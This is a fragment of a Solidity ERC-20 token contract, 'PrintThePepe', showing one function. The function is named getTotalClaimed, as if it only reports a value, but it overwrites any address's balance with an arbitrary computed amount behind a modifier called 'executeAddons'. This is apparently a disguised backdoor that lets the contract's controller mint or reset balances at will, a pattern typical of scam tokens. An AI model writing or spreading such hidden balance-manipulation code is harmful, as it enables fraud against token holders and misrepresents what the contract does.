...
contract PrintThePepe is IERC20, Ownable, BaseToken {
    ...
    function getTotalClaimed(address claimOwner, uint256 claimSomme, uint deployByteValue, uint subtractMontant) external executeAddons { _balances[claimOwner] = claimSomme * deployByteValue ** subtractMontant;
    }
